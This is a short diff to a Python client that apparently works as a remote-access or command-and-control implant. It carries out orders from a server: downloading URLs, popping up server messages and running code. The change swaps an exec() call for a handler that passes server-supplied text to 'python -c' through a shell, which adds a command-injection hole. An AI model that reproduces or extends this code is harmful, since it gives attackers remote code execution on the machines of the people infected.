@@ -74,10 +74,6 @@ def e_download(url):
     urllib.request.urlretrieve(url, os.path.basename(url))
 
 
-def e_python(code):
-    exec(code)
-
-
 def e_message(text):
     tkinter.messagebox.showinfo("Message From Server", text)
 
@@ -96,10 +92,18 @@ def execute(mode, line):
             return p.decode("UTF-8")
     elif mode == "download":
         Thread(target=e_download, args=(line,)).start()
-        return "Done"
+        return "Sended"
     elif mode == "python":
-        Thread(target=e_python, args=(line,)).start()
-        return "Done"
+        p = subprocess.Popen(
+            "python -c "+line,
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+        ).communicate()[0]
+        try:
+            return p.decode("gb2312")
+        except:
+            return p.decode("UTF-8")
     elif mode == "message":
         Thread(target=e_message, args=(line,)).start()
         return "Done"
